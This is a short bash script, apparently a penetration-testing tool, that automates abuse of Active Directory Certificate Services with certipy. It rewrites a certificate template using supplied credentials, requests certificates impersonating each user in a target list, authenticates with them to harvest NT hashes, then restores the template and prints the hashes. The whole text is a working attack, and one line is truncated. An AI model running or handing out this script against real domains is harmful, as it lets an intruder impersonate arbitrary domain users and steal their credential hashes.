if [ $# -lt 1 ]; then
        echo DumpNTDS_ADCS.sh username domain password template_name target_ca ca_name dc-ip users_targeted
else
        username=$1; domain=$2; password=$3; template=$4; target_ca=$5; ca=$6; dc=$7; users_targeted=$8; execution_date=`date +%s`; output_dir='output_'$template'_'$execution_date
        mkdir $output_dir
        echo "> Updating the cert template " $template_name
        certipy template -u $username'@'$domain -p $password -template $template -save-old | tee -a $output_dir/logs.txt
        mv $template'.json' $output_dir
        echo "> Reading targeted users from the file: "$users_targeted
        for requested_user in `cat $users_targeted | cut -d '' -f 1`; do 
                echo "> Requesting a certificate for:" $requested_user
                certipy req -u $username'@'$domain -p $password  -target $target_ca -template $template -ca $ca -upn $requested_user'@'$domain -out $output_dir/$requested_user | tee -a $output_dir/logs.t>
                echo "> Authenticating with a certificate for:" $requested_user
                certipy auth -pfx $output_dir/$requested_user'.pfx' -dc-ip $dc | tee -a $output_dir/logs.txt
        done
        certipy template -u $username'@'$domain -p $password -template $template -configuration $output_dir/$template'.json'
        echo "> This is your hashes: "
        grep "Got hash for" $output_dir/logs.txt 
